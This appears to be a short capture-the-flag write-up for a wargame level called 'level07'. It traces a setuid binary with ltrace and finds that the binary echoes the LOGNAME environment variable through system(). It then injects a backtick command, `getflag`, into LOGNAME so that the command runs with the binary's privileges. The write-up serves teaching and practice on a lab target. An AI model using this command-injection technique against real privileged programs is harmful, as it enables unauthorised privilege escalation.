here we have a executable who only print "level07"

```sh
$: ./level07
level07
```

**we try to learn more about the executable with trace command**

```sh
$: ltrace ./level07
RESULT: 
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                       = 2007
geteuid()                                                       = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)             = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)             = 0
getenv("LOGNAME")                                               = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff60, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                          = 0
+++ exited (status 0) +++
```

**we see that the executable get the "level07" string from the LOGNAME env variable**
**so we will make the program echo the result of the getflag command**

```sh
$: LOGNAME=\`getflag\` ./level07
check flag.Here is your token : *******flag********
```

